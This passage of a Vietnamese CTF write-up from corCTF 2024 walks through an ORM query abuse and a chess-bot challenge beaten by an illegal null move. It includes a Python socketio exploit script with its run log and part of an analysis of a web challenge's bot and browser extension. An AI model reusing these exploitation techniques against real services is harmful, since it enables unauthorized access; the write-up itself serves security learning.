- Ho·∫∑c ·ªü ƒë√¢y ta s·∫Ω d√πng ƒëi·ªÅu ki·ªán on s·∫Ω check ƒëi·ªÅu ki·ªán kicked l√† true v√† l·ªçc ra user `goroo`:
![image](https://hackmd.io/_uploads/SJDEPoIt0.png)

``
/api/writeups?include[all]=All&include[on][kicked]=1
``

![image](https://hackmd.io/_uploads/HJvmujUFA.png)


flag: `corctf{erm?_more_like_orm_amiright?}`


## msfrogofwar3

- M·ªôt ·ª©ng d·ª•ng play chess realtime v·ªõi bot s·ª≠ d·ª•ng `stockfish` v√† socketIO v·ªõi flask.
- Theo nh∆∞ t√¨m hi·ªÉu th√¨ stockfish l√† m·ªôt engine c·ªù vua kh√° ph·ªï bi·∫øn hi·ªán nay d√πng ƒë·ªÉ ph√¢n t√≠ch v√† ch∆°i c·ªù vua ƒë·ªÉ ƒë∆∞a ra nh·ªØng n∆∞·ªõc ƒëi m·ªôt c√°ch t·ªët nh·∫•t v√† ·ªü ch∆∞∆°ng tr√¨nh n√†y th√¨ n√≥ l√† bot v√† s·∫Ω ch∆°i v·ªõi m√¨nh.


### analyst

- B√¢y gi·ªù th√¨ ta s·∫Ω ƒëi v√†o ph√¢n t√≠ch logic c·ªßa m√£ ngu·ªìn ƒëang ch·∫°y:

```
from flask import Flask, request, render_template
from flask_socketio import SocketIO, emit
from stockfish import Stockfish
import random
import chess

games = {}

toxic_msges = [
    "?",
    "rip bozo",
    "so bad lmfaoo",
    "ez",
    "skill issue",
    "mad cuz bad",
    "hold this L",
    "L + ratio + you fell off",
    "i bet your main category is stego",
    "have you tried alt+f4?",
    "ü§°ü§°ü§°"
]

win_msges = [
    "lmaooooooooo ur so bad",
    "was that it?",
    "zzzzzzzzzzzzzzzzzzzzzz",
    "hopefully the next game wont be so quick",
    "nice try - jk that was horrible",
    "this aint checkers man"
]

TURN_LIMIT = 15
STOCKFISH_DEPTH = 21
FLAG = "corctf{this_is_a_fake_flag}"

class GameWrapper:
    def __init__(self, emit):
        self.emit = emit
        self.board = chess.Board(chess.STARTING_FEN)
        self.moves = []
        self.player_turn = True

    def get_player_state(self):
        legal_moves = [f"{m}" for m in self.board.legal_moves] if self.player_turn and self.board.fullmove_number < TURN_LIMIT else []

        status = "running"
        if self.board.fullmove_number >= TURN_LIMIT:
            status = "turn limit"

        if outcome := self.board.outcome():
            if outcome.winner is None:
                status = "draw"
            else:
                status = "win" if outcome.winner == chess.WHITE else "lose"

        return {
            "pos": self.board.fen(),
            "moves": legal_moves,
            "your_turn": self.player_turn,
            "status": status,
            "turn_counter": f"{self.board.fullmove_number} / {TURN_LIMIT} turns"
        }

    def play_move(self, uci):
        if not self.player_turn:
            return
        if self.board.fullmove_number >= TURN_LIMIT:
            return
        
        self.player_turn = False

        outcome = self.board.outcome()
        if outcome is None:
            try:
                move = chess.Move.from_uci(uci)
                if move:
                    if move not in self.board.legal_moves:
                        self.player_turn = True
                        self.emit('state', self.get_player_state())
                        self.emit("chat", {"name": "System", "msg": "Illegal move"})
                        return
                    self.board.push_uci(uci)
            except:
                self.player_turn = True
                self.emit('state', self.get_player_state())
                self.emit("chat", {"name": "System", "msg": "Invalid move format"})
                return
        elif outcome.winner != chess.WHITE:
            self.emit("chat", {"name": "üê∏", "msg": "you lost, bozo"})
            return

        self.moves.append(uci)

        # stockfish has a habit of crashing
        # The following section is used to try to resolve this
        opponent_move, attempts = None, 0
        while not opponent_move and attempts <= 10:
            try:
                attempts += 1
                engine = Stockfish("./stockfish/stockfish-ubuntu-x86-64-avx2", parameters={"Threads": 4}, depth=STOCKFISH_DEPTH)
                for m in self.moves:
                    if engine.is_move_correct(m):
                        engine.make_moves_from_current_position([m])
                opponent_move = engine.get_best_move_time(3_000)
            except:
                pass

        if opponent_move != None:
            self.moves.append(opponent_move)
            opponent_move = chess.Move.from_uci(opponent_move)
            if self.board.is_capture(opponent_move):
                self.emit("chat", {"name": "üê∏", "msg": random.choice(toxic_msges)})
            self.board.push(opponent_move)
            self.player_turn = True
            self.emit("state", self.get_player_state())

            if (outcome := self.board.outcome()) is not None:
                if outcome.termination == chess.Termination.CHECKMATE:
                    if outcome.winner == chess.BLACK:
                        self.emit("chat", {"name": "üê∏", "msg": "Nice try... but not good enough üê∏"})
                    else:
                        self.emit("chat", {"name": "üê∏", "msg": "how??????"})
                        self.emit("chat", {"name": "System", "msg": FLAG})
                else: # statemate, insufficient material, etc
                    self.emit("chat", {"name": "üê∏", "msg": "That was close... but still not good enough üê∏"})
        else:
            self.emit("chat", {"name": "System", "msg": "An error occurred, please restart"})

app = Flask(__name__, static_url_path='', static_folder='static')
socketio = SocketIO(app, cors_allowed_origins='*')

@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'max-age=604800'
    return response

@app.route('/')
def index_route():
    return render_template('index.html')

@socketio.on('connect')
def on_connect(_):
    games[request.sid] = GameWrapper(emit)
    emit('state', games[request.sid].get_player_state())

@socketio.on('disconnect')
def on_disconnect():
    if request.sid in games:
        del games[request.sid]

@socketio.on('move')
def onmsg_move(move):
    try:
        games[request.sid].play_move(move)
    except:
        emit("chat", {"name": "System", "msg": "An error occurred, please restart"})

@socketio.on('state')
def onmsg_state():
    emit('state', games[request.sid].get_player_state())
```

- S·ª≠ d·ª•ng socketIO ƒë·ªÉ connect v·ªõi server -> ·ªü ƒë√¢y l√† m·ªói ng∆∞·ªùi ch∆°i s·∫Ω c√≥ m·ªôt session ri√™ng v√† n·∫øu emit `move` -> th√¨ s·∫Ω g·ªçi ph∆∞∆°ng th·ª©c play_move ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ class `GameWrapper`
C√πng ph√¢n t√≠ch s√¢u m·ªôt ch√∫t class n√†y:

- khi kh·ªüi t·∫°o m·ªôt ƒë·ªëi t∆∞·ª£ng s·∫Ω kh·ªüi t·∫°o c√°c gi√° tr·ªã emit , board , move l√† v·ªã tr√≠, player_tern = true t·ª©c l√† ƒë·∫ßu ti√™n ng∆∞·ªùi ch∆°i s·∫Ω ƒë∆∞·ª£c di chuy·ªÉn tr∆∞·ªõc.
Quan s√°t ph∆∞∆°ng th·ª©c `play_move` ƒë∆∞·ª£c g·ªçi khi client emit `move`:

- Y√™u c·∫ßu ph·∫£i ƒëang l∆∞·ª£t c·ªßa ng∆∞·ªùi ch∆°i m·ªõi ƒë∆∞·ª£c th·ª±c thi v√† n·∫øu qu√° 15 l∆∞·ª£t th√¨ s·∫Ω kh√¥ng ƒë∆∞·ª£c di chuy·ªÉn (t·ª©c l√† thua) v√† v√°n c·ªù ch∆∞a k·∫øt th√∫c.
- `move = chess.Move.from_uci(uci)` s·ª≠ d·ª•ng trong Python l√† ƒë·ªÉ t·∫°o m·ªôt ƒë·ªëi t∆∞·ª£ng Move t·ª´ m·ªôt chu·ªói UCI (Universal Chess Interface) ƒë·∫°i di·ªán cho m·ªôt n∆∞·ªõc ƒëi trong c·ªù vua l√† gi√° tr·ªã c·ªßa move m√† ta emit ki·ªÉm tra n·∫øu n∆∞·ªõc ƒëi c√≥ h·ª£p l·ªá hay kh√¥ng n·∫øu m√† kh√¥ng th√¨ tr·∫£ ra tin `msg": "Illegal move` c√≤n n·∫øu h·ª£p l·ªá th√¨ ƒë·∫©y n∆∞·ªõc ƒëi v√†o trong b·∫£ng c·ªù. 
- V√† n·∫øu m√¨nh thua -> t·ª©c l√† qu√¢n tr·∫Øng thua th√¨ g·ª≠i tin `msg": "you lost, bozo"`


```
opponent_move, attempts = None, 0
        while not opponent_move and attempts <= 10:
            try:
                attempts += 1
                engine = Stockfish("./stockfish/stockfish-ubuntu-x86-64-avx2", parameters={"Threads": 4}, depth=STOCKFISH_DEPTH)
                for m in self.moves:
                    if engine.is_move_correct(m):
                        engine.make_moves_from_current_position([m])
                opponent_move = engine.get_best_move_time(3_000)
            except:
                pass
```

- V√≤ng l·∫∑p tr√™n s·∫Ω l·∫•y n∆∞·ªõc ƒëi t·ªët nh·∫•t n·∫øu m√† kh√¥ng th√†nh c√¥ng sau 10 l·∫ßn tr·∫£ ra l·ªói -> n·∫øu t√¨m ra n√≥ s·∫Ω di chuy·ªÉn theo n∆∞·ªõc t·∫°i uci ƒë√≥.

Ki·ªÉm tra k·∫øt th√∫c v√°n c·ªù:
- if (outcome := self.board.outcome()) is not None:: Ki·ªÉm tra xem v√°n c·ªù ƒë√£ k·∫øt th√∫c ch∆∞a.
- if outcome.termination == chess.Termination.CHECKMATE:: N·∫øu v√°n c·ªù k·∫øt th√∫c b·∫±ng chi·∫øu h·∫øt.
- if outcome.winner == chess.BLACK:: N·∫øu ƒë·ªëi th·ªß th·∫Øng (Stockfish l√† qu√¢n ƒëen), g·ª≠i th√¥ng b√°o "Nice try... but not good enough üê∏".
- else:: N·∫øu ng∆∞·ªùi ch∆°i th·∫Øng, g·ª≠i th√¥ng b√°o "how??????" v√† c√≥ th·ªÉ th√™m FLAG.
- else:: N·∫øu v√°n c·ªù k·∫øt th√∫c v·ªõi m·ªôt k·∫øt qu·∫£ kh√°c (h√≤a,..), g·ª≠i th√¥ng b√°o "That was close... but still not good enough üê∏".


- C√≥ th·ªÉ th·∫•y y√™u c·∫ßu l√† ch√∫ng ta ph·∫£i th·∫Øng stockfish sau 15 l∆∞·ª£t tr·ªü xu·ªëng -> li·ªáu ƒëi·ªÅu n√†y c√≥ kh·∫£ thi khi m√† ch√∫ng ta ch∆°i kh√° l√† nghi·ªáp d∆∞.

### solution1

- Theo stockfish th√¨ uci `0000` l√† m·ªôt n∆∞·ªõc ƒëi h·ª£p l√≠ trong c·ªù vua v√† n·∫øu ng∆∞·ªùi ch∆°i ƒëi n∆∞·ªõc n√†y th√¨ stockfish s·∫Ω nghƒ© n∆∞·ªõc ti·∫øp theo d√†nh cho qu√¢n ƒëi n∆∞·ªõc n√†y -> ta s·∫Ω l·ª£i d·ª•ng vi·ªác n√†y ƒë·ªÉ tr·ªü th√†nh ng∆∞·ªùi ƒëi qu√¢n ƒëen v√† stockfish ƒëi qu√¢n tr·∫Øng -> theo nh∆∞ h√†m check th√¨ ta th·∫•y:

```
if (outcome := self.board.outcome()) is not None:
                if outcome.termination == chess.Termination.CHECKMATE:
                    if outcome.winner == chess.BLACK:
                        self.emit("chat", {"name": "üê∏", "msg": "Nice try... but not good enough üê∏"})
                    else:
                        self.emit("chat", {"name": "üê∏", "msg": "how??????"})
                        self.emit("chat", {"name": "System", "msg": FLAG})
                else: # statemate, insufficient material, etc
                    self.emit("chat", {"name": "üê∏", "msg": "That was close... but still not good enough üê∏"})
```

- Ch∆∞∆°ng tr√¨nh s·∫Ω ki·ªÉm tra xem b√™n th·∫Øng n·∫øu l√† tr·∫Øng th√¨ s·∫Ω nh·∫≠n ƒë∆∞·ª£c flag -> v·∫≠y th√¨ b√¢y gi·ªù th·∫≠t d·ªÖ d√†ng cho ch√∫ng ta ƒë√°nh thua bot trong d∆∞·ªõi 15 n∆∞·ªõc b·∫±ng vi·ªác di chuy·ªÉn vua ƒë·ªÉ bot chi·∫øu h·∫øt nhanh nh·∫•t -> v√† c√≥ nhi·ªÅu c√°ch ƒë·ªÉ di chuy·ªÉn.

![image](https://hackmd.io/_uploads/rya2u8cFR.png)

![image](https://hackmd.io/_uploads/r1NmCS5F0.png)

poc: 

```
import socketio
import time

sio = socketio.Client()

moves = ["0000", "e7e5", "e8e7", "e7d6", "d6c5", "c5d4", "d4d3"]

GLOB_IDX = 0

@sio.event
def connect():
    print("Connected to server")
    sio.emit('state')

@sio.event
def disconnect():
    print("Disconnected from server")

@sio.event
def state(data):
    global GLOB_IDX
    print("Current state:")
    print(data)
    try:
        if data['your_turn']:
            print("SENDING", moves[GLOB_IDX])
            sio.emit("move", moves[GLOB_IDX])
            GLOB_IDX += 1
    except IndexError:
        print("PRINTING EVIL")

@sio.event
def chat(data):
    if data["msg"] == ":frog:: how??????":
        print("PRINTING EVIL")
    print(f"{data['name']}: {data['msg']}")

SERVER_URL = 'http://localhost:8000/'
sio.connect(SERVER_URL)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Client interrupted")

sio.disconnect()
```


```
l3mnt2010@ASUSEXPERTBOOK:~/corCTF2024/frogmisc$ python3 sol.py
websocket-client package not installed, only polling transport is available
Current state:
{'pos': 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1', 'moves': ['g1h3', 'g1f3', 'b1c3', 'b1a3', 'h2h3', 'g2g3', 'f2f3', 'e2e3', 'd2d3', 'c2c3', 'b2b3', 'a2a3', 'h2h4', 'g2g4', 'f2f4', 'e2e4', 'd2d4', 'c2c4', 'b2b4', 'a2a4'], 'your_turn': True, 'status': 'running', 'turn_counter': '1 / 15 turns'}
SENDING 0000
Connected to server
Current state:
{'pos': 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1', 'moves': [], 'your_turn': False, 'status': 'running', 'turn_counter': '1 / 15 turns'}
Current state:
{'pos': 'rnbqkbnr/pppppppp/8/8/4P3/8/PPPP1PPP/RNBQKBNR b KQkq - 0 1', 'moves': ['g8h6', 'g8f6', 'b8c6', 'b8a6', 'h7h6', 'g7g6', 'f7f6', 'e7e6', 'd7d6', 'c7c6', 'b7b6', 'a7a6', 'h7h5', 'g7g5', 'f7f5', 'e7e5', 'd7d5', 'c7c5', 'b7b5', 'a7a5'], 'your_turn': True, 'status': 'running', 'turn_counter': '1 / 15 turns'}
SENDING e7e5
Current state:
{'pos': 'rnbqkbnr/pppp1ppp/8/4p3/4P3/5N2/PPPP1PPP/RNBQKB1R b KQkq - 1 2', 'moves': ['g8e7', 'g8h6', 'g8f6', 'f8e7', 'f8d6', 'f8c5', 'f8b4', 'f8a3', 'e8e7', 'd8e7', 'd8f6', 'd8g5', 'd8h4', 'b8c6', 'b8a6', 'h7h6', 'g7g6', 'f7f6', 'd7d6', 'c7c6', 'b7b6', 'a7a6', 'h7h5', 'g7g5', 'f7f5', 'd7d5', 'c7c5', 'b7b5', 'a7a5'], 'your_turn': True, 'status': 'running', 'turn_counter': '2 / 15 turns'}
SENDING e8e7
üê∏: ez
Current state:
{'pos': 'rnbq1bnr/ppppkppp/8/4N3/4P3/8/PPPP1PPP/RNBQKB1R b KQ - 0 3', 'moves': ['g8h6', 'g8f6', 'd8e8', 'b8c6', 'b8a6', 'e7e8', 'e7f6', 'e7e6', 'e7d6', 'h7h6', 'g7g6', 'f7f6', 'd7d6', 'c7c6', 'b7b6', 'a7a6', 'h7h5', 'g7g5', 'f7f5', 'd7d5', 'c7c5', 'b7b5', 'a7a5'], 'your_turn': True, 'status': 'running', 'turn_counter': '3 / 15 turns'}
SENDING e7d6
üê∏: so bad lmfaoo
Current state:
{'pos': 'rnbq1bnr/pppp1Npp/3k4/8/4P3/8/PPPP1PPP/RNBQKB1R b KQ - 0 4', 'moves': ['d6e7', 'd6e6', 'd6c6', 'd6c5'], 'your_turn': True, 'status': 'running', 'turn_counter': '4 / 15 turns'}
SENDING d6c5
Current state:
{'pos': 'rnbq1bnr/pppp1Npp/8/2k5/4P3/8/PPPPQPPP/RNB1KB1R b KQ - 2 5', 'moves': ['g8e7', 'g8h6', 'g8f6', 'f8e7', 'f8d6', 'd8e8', 'd8e7', 'd8f6', 'd8g5', 'd8h4', 'b8c6', 'b8a6', 'c5c6', 'c5b6', 'c5d4', 'c5b4', 'h7h6', 'g7g6', 'd7d6', 'c7c6', 'b7b6', 'a7a6', 'h7h5', 'g7g5', 'd7d5', 'b7b5', 'a7a5'], 'your_turn': True, 'status': 'running', 'turn_counter': '5 / 15 turns'}
SENDING c5d4
Current state:
{'pos': 'rnbq1bnr/pppp1Npp/8/8/3kP3/4Q3/PPPP1PPP/RNB1KB1R b KQ - 4 6', 'moves': [], 'your_turn': True, 'status': 'win', 'turn_counter': '6 / 15 turns'}
SENDING d4d3
üê∏: how??????
System: corctf{this_is_a_fake_flag}
System: An error occurred, please restart

```

### solution 2

- C√¢u tr·∫£ l·ªùi ƒë∆∞·ª£c tr·∫£ l·ªùi ·ªü ph·∫ßn n√¢ng cao c·ªßa UCI command c·ªßa stockfish ·ªü [ƒë√¢y](https://github.com/official-stockfish/Stockfish/wiki/UCI-&-Commands).
- ·ªü m·ª•c [option](https://github.com/official-stockfish/Stockfish/wiki/UCI-&-Commands#setoption) c√≥ th·ªÉ th·∫•y

![image](https://hackmd.io/_uploads/SkAgMM9K0.png)

- Option debug logfile s·∫Ω `Ghi m·ªçi th√¥ng tin li√™n l·∫°c ƒë·∫øn v√† ƒëi t·ª´ ƒë·ªông c∆° v√†o m·ªôt t·ªáp vƒÉn b·∫£n` -> v·∫≠y √Ω t∆∞·ªüng l√† ghi SSTI v√†o trong file template `jinja2`.

![image](https://hackmd.io/_uploads/r1Zx98qYC.png)

- ƒê√¢y l√† file index.html templates c·ªßa ch√∫ng ta tr∆∞·ªõc khi tess -> nh∆∞ng v·∫•n ƒë·ªÅ g·∫∑p ph·∫£i l√† uci b·ªã check format v√† ch∆∞a c√≥ c√°ch n√†o ƒë·ªÉ write SSTI v√†o index. [ƒêang nghi√™n c·ª©u th√™m solution n√†y]

flag: `corctf{replace}` nh∆∞ h√¨nh th√¨ c√≥ v·∫ª end gi·∫£i r·ªìi n√™n kh·ªüi t·∫°o flag b·ªã sai


## corctf-challenge-dev

- M·ªôt th·ª≠ th√°ch v·ªõi nodejs -> khai th√°c bug c·ªßa extention chrome + template ejs.

![image](https://hackmd.io/_uploads/BkQZqOPY0.png)


### analysis

- ƒêi v√†o ph√¢n t√≠ch source c·ªßa chall.

```
// index.js
const express = require("express");
const crypto = require("crypto");
const session = require("express-session");
const MemoryStore = require("memorystore")(session)

const app = express();

const PORT = process.env.PORT || 8080;

const db = require("./db.js");
const bot = require("./bot/bot.js");

app.use(
    session({
        cookie: { maxAge: 3600000 },
        store: new MemoryStore({
            checkPeriod: 3600000,
        }),
        resave: false,
        saveUninitialized: false,
        secret: crypto.randomBytes(32).toString("hex"),
    })
);

app.use(express.static("public"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
	const nonce = crypto.randomBytes(16).toString('base64');
    res.setHeader(
        "Content-Security-Policy",
        `base-uri 'none'; script-src 'nonce-${nonce}'; img-src *; font-src 'self' fonts.gstatic.com; require-trusted-types-for 'script';`
    );
    res.locals.user = null;
    if (req.session.user && db.hasUser({user: req.session.user})) {
        req.user = db.getUser({user: req.session.user});
        res.locals.user = req.user;
	}
	res.locals.nonce = nonce;
    next();
});

app.set('view engine', 'ejs');

app.use("/api", require("./routes/api.js"));

const requiresLogin = (req, res, next) => 
	req.user
		? next()
		: res.redirect('/login');

app.get("/", (req, res) => res.render("index"));

app.get("/login", (req, res) => res.render("login"));

app.get("/register", (req, res) => res.render("register"));

app.get("/create", requiresLogin, (req, res) => res.render("create"));

app.get("/challenges", requiresLogin, (req, res) => res.render("challenges"));

app.get("/challenge/:id", (req, res) => {
    let { id } = req.params;
    if (!id) {
        return res.json({ success: false, error: "No id provided" });
    }
    if (!db.hasChallenge({id: id})) {
        return res.status(404).send("Challenge not found!");
    }
	challenge = db.getChallenge({id: id});
	res.render('challenge', { challenge });
});

app.get("/submit", requiresLogin, (req, res) => {
    const { url } = req.query;
    
    if (!url || typeof url !== "string") {
        return res.send('missing url');
    }

    const urlObj = new URL(url);
    if (!['http:', 'https:'].includes(urlObj.protocol)) {
        return res.send('url must be http/https')
    }

    bot.visit(url);
    res.send('the admin will visit your url soon');
});

app.listen(PORT, () => console.log(`app listening on port ${PORT}`));
```

- C√≥ c√°c ch·ª©c nƒÉng l√† register -> login -> create challenges -> view challenges -> submit url c·ªßa chall cho admin l√† bot ch·∫°y v·ªõi pupperteer:

```
const crypto = require("crypto");

const users = new Map();
const challenges = new Map();

const sha256 = (data) => crypto.createHash("sha256").update(data).digest("hex");

const addUser = ({ user, pass }) => {
	users.set(user, {
		pass: sha256(pass),
		challenges: [],
	});
};

const hasUser = ({ user }) => {
	return users.has(user);
}

const getUser = ({ user }) => {
	return users.get(user);
}

const checkPass = ({ user, pass }) => {
	return users.get(user).pass === sha256(pass)
}

const addChallenge = ({title, description}) => {
	let id = crypto.randomBytes(6).toString("hex");
	challenges.set(id, { id, title, description });
	return id;
}

const hasChallenge = ({ id }) => {
	return challenges.has(id);
}

const getChallenge = ({ id }) => {
	return challenges.get(id);
}

module.exports = { users, challenges, addUser, hasUser, getUser, checkPass, addChallenge, hasChallenge, getChallenge };

```


- D∆∞·ªõi ƒë√¢y l√† api ch√≠nh c·ªßa server:
```
// api.js

const express = require("express");
const db = require("../db.js");

const router = express.Router();

const requiresLogin = (req, res, next) =>
    req.user
        ? next()
        : res.json({ success: false, error: "You must be logged in!" });

router.post("/login", (req, res) => {
    let { user, pass } = req.body;
    if (!user || !pass || typeof user !== "string" || typeof pass !== "string") {
        return res.json({
            success: false,
            error: "Missing username or password",
        });
    }

    if (!db.hasUser({user: user})) {
        return res.json({
            success: false,
            error: "No user exists with that username",
        });
    }

    if (!db.checkPass({user: user, pass: pass})) {
        return res.json({ success: false, error: "Invalid password" });
    }

    req.session.user = user;
    res.json({ success: true });
});

router.post("/register", (req, res) => {
    let { user, pass } = req.body;
    if ( !user || !pass || typeof user !== "string" || typeof pass !== "string") {
        return res.json({
            success: false,
            error: "Missing username or password",
        });
    }

    if (db.hasUser({user: user})) {
        return res.json({
            success: false,
            error: "User already exists",
        });
    }

    req.session.user = user;
	db.addUser({user: user, pass: pass});
    res.json({ success: true });
});

router.post("/create", requiresLogin, (req, res) => {
    let { title, description } = req.body;
    if (!title || !description || typeof title !== "string" || typeof description !== "string") {
        return res.json({ success: false, error: "Missing title or description" });
    }

    req.user.challenges.push(db.addChallenge({title: title, description: description}));

    res.json({ success: true });
});

router.post("/challenges", requiresLogin, (req, res) => {
    return res.json({
        success: true,
        data: req.user.challenges.map((id) => db.getChallenge({id: id})),
    });
});

module.exports = router;
```

- Nh∆∞ ƒë√£ n√≥i ·ªü tr√™n th√¨ api ch√≠nh ƒë√≥ l√† `/create` v√† t·∫°o challenge.

-> V·∫≠y th√¨ flag n·∫±m ·ªü ƒë√¢u -> v·ªõi c√°c th·ª≠ th√°ch client hi·ªán nay th√¨ n√≥ n·∫±m ·ªü bot:

```
const puppeteer = require("puppeteer");

const FLAG = process.env.FLAG || "corctf{test_flag}";

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const path = require("path");
const ext = path.resolve(__dirname, "./extension/");

const visit = async (url) => {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            pipe: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                `--disable-extensions-except=${ext}`,
                `--load-extension=${ext}`
            ],
            dumpio: true
        });

        const page = await browser.newPage();
        // NOTE: this is where the flag is on remote
        await page.goto("http://localhost:8080", { timeout: 5000, waitUntil: 'networkidle2' });

        page.evaluate((flag) => {
            document.cookie = "flag=" + flag;
        }, FLAG);

        // go to exploit page
        await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' });
        await sleep(10_000);

        await browser.close();
        browser = null;
    } catch (err) {
        console.log(err);
    } finally {
        if (browser) await browser.close();
    }
};

module.exports = { visit };
```

### extension

- Tr√™n m√¥i tr∆∞·ªùng production th√¨ FLAG n·∫±m ·ªü env v√† s·∫Ω ƒë∆∞·ª£c g·∫Øn v√†o trong cookie c·ªßa browser nh∆∞ tr√™n -> bot s·∫Ω load ƒë·∫øn server tr∆∞·ªõc sau ƒë√≥ s·∫Ω `goto` url m√† ch√∫ng ta submit -> ƒë·ªÉ √Ω l√† ·ªü ƒë√¢y pupperteer s·∫Ω s·ª≠ d·ª•ng tr√¨nh duy·ªát chrome c√≥ s·∫µn extension ƒë∆∞·ª£c config s·∫µn:

![image](https://hackmd.io/_uploads/rJ9w3dPtC.png)

![image](https://hackmd.io/_uploads/ByVQpdvKC.png)

- ƒêi v√†o xem x√©t c√°ch ho·∫°t ƒë·ªông c·ªßa extension n√†y:
- Theo nh∆∞ tr·ª±c quan ·ªü h√¨nh tr√™n ta th·∫•y th√¨ n√≥ ƒë∆∞·ª£c render t·ª´ `form_handler.js`

```
const origin = window.location.origin;

const base_rule = {
	"action": {
		"type": "block",
		"redirect": {},
		"responseHeaders": [],
		"requestHeaders": []
	},
	"condition": {
		"initiatorDomains": [origin],
		"resourceTypes": ['image', 'media', 'script']
	}
};

function serializeForm(items) {
    const result = {};
    items.forEach(([key, value]) => {
        const keys = key.split('.');
        let current = result;
		for (let i = 0; i < keys.length - 1; i++) {
            const k = keys[i];
            if (!(k in current)) {
                current[k] = {};
            }
            current = current[k];
        }
        current[keys[keys.length - 1]] = isNaN(value) ? value : Number(value);
    });

    return result;
}

// inject modal
const modal = document.createElement('div');
modal.id = 'block-modal';
modal.classList.add('modal');

modal.innerHTML = `<div class="modal-content">
					<span class="close">&times;</span>
					<form id='block-options'>
						<fieldset>
							<legend>Block URL</legend>
							<label for='priority'>Priority:</label>
							<input type='text' id='priority' name='priority'>
							<div id='condition'>
								<label for='urlFilter'>Blocked URL:</label>
								<input type='text' id='urlFilter' name='condition.urlFilter'><br>
							</div>
							<button type='button' id='submit-btn' class='fizzblock'>Add URL!</button>
						</fieldset>
					</form>
				  </div>`;

modal.querySelector('#submit-btn').addEventListener('click', async () => {
	const obj = serializeForm(Array.from(new FormData(document.getElementById('block-options'))));
	const merged_obj = _.merge(base_rule, obj);

	chrome.storage.local.get(origin).then((data) => {
		let arr = data[origin];
		if (arr == null) {
			arr = [];
		}
		arr.push(merged_obj);
		console.log(merged_obj);
		chrome.storage.local.set(Object.fromEntries([[origin, arr]]));
	});
});

// listeners to close modal
modal.querySelector('.close').addEventListener('click', () => {modal.style.display = 'none';});
window.addEventListener('click', (event) => {
	if (event.target == modal) {
		modal.style.display = 'none';
	}
});

document.body.insertBefore(modal, document.body.childNodes[0]);

// inject modal trigger button
const modal_button = document.createElement('button');
modal_button.type = 'button';
modal_button.id = 'modal-button';
modal_button.classList.add('fizzblock');
modal_button.textContent = "Open block settings";

// modal listener
modal_button.addEventListener('click', async () => {
	const modal = document.getElementById('block-modal');
	modal.style.display = 'block';
});

document.body.insertBefore(modal_button, document.body.childNodes[0]);
```

- ƒê·∫ßu ti√™n th√¨ kh·ªüi t·∫°o c√°c bi·∫øn l√† origin -> g√°n b·∫±ng window.location.origin, base_rule c√≥ v·∫ª nh∆∞ l√† ƒëi·ªÅu l·ªá c∆° b·∫£n c·ªßa ti·ªán √≠ch n√†y.
- Sau ƒë√≥ t·∫°o m·ªôt modal v√† hi·ªÉn th·ªã form nh∆∞ ta th·∫•y ·ªü tr√™n -> khi ta m·ªü modal ra t·ª©c l√† click v√†o button `open block settings` th√¨ s·∫Ω g·ªçi h√†m `serializeForm` v·ªõi c√°c value m√† ta ƒëi·ªÅn v√†o form -> tr·∫£ ra m·ªôt object sau khi x·ª≠ l√≠ -> g·ªçi `_.merge(base_rule, obj);` h√†m merge n√†y ƒë∆∞·ª£c l·∫•y t·ª´ th∆∞ vi·ªán Lodash -> l∆∞u c√°c gi√° tr·ªã theo t·ª´ng origin v√†o `storage` c·ªßa chrome theo d·∫°ng origin: array.

- Ti·∫øp theo ta ch√∫ √Ω ƒë·∫øn back-ground js c·ªßa extension n√†y l√†: 

```
// request-handler.js

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
	if (changeInfo.status == 'loading' && tab.url.indexOf(tab.index > -1)) {
		const origin = (new URL(tab.url)).origin;
		registerRules(origin);
	}
});

const registerRules = (url) => {
	chrome.storage.local.get(url).then((data) => {
		const arr = data[url];
		if (arr != null) {
			for (let i = 0; i < arr.length; i++) {
				const rule = arr[i];
				rule['id'] = i+1;
				chrome.declarativeNetRequest.updateDynamicRules({
					addRules: [
						rule
					],
					removeRuleIds: [i+1]
				});
			}
		}
	});
};

// rules for corctf-challenge-dev.be.ax
const rules = [
{
	"action": { // fizzbuzz hates microsoft!
		"type": "block",
		"redirect": {},
		"responseHeaders": [],
		"requestHeaders": []
	},
	"condition": {
		"initiatorDomains": ["corctf-challenge-dev.be.ax"],
		"resourceTypes": ['image', 'media', 'script'],
		"urlFilter": "https://microsoft.com*"
	}
},
{
	"action": { // block subdomains too
		"type": "block",
		"redirect": {},
		"responseHeaders": [],
		"requestHeaders": []
	},
	"condition": {
		"initiatorDomains": ["corctf-challenge-dev.be.ax"],
		"resourceTypes": ['image', 'media', 'script'],
		"urlFilter": "https://*.microsoft.com*"
	}
},
{
	"action": { // fizzbuzz hates systemd!
		"type": "block",
		"redirect": {},
		"responseHeaders": [],
		"requestHeaders": []
	},
	"condition": {
		"initiatorDomains": ["corctf-challenge-dev.be.ax"],
		"resourceTypes": ['image', 'media', 'script'],
		"urlFilter": "https://systemd.io*"
	}
}
];

chrome.storage.local.set({"https://corctf-challenge-dev.be.ax": rules});
```

- Nh∆∞ ·ªü form-handler ta th·∫•y khi m√† m·ªü modal v√† nh·∫≠p form ta s·∫Ω l·∫•y d·ªØ li·ªáu t·ª´ `chrome.storage` v√† n√≥ di·ªÖn ra t·∫°i ƒë√¢y.


- Quay tr·ªü l·∫°i v·ªõi server th√¨ ta c√≥ th·ªÉ th·∫•y CSP ƒë√£ ƒë∆∞·ª£c set ƒë·ªÉ tr√°nh XSS ƒë∆∞·ª£c x·∫£y ra.

```
app.use((req, res, next) => {
	const nonce = crypto.randomBytes(16).toString('base64');
    res.setHeader(
        "Content-Security-Policy",
        `base-uri 'none'; script-src 'nonce-${nonce}'; img-src *; font-src 'self' fonts.gstatic.com; require-trusted-types-for 'script';`
    );
    res.locals.user = null;
    if (req.session.user && db.hasUser({user: req.session.user})) {
        req.user = db.getUser({user: req.session.user});
        res.locals.user = req.user;
	}
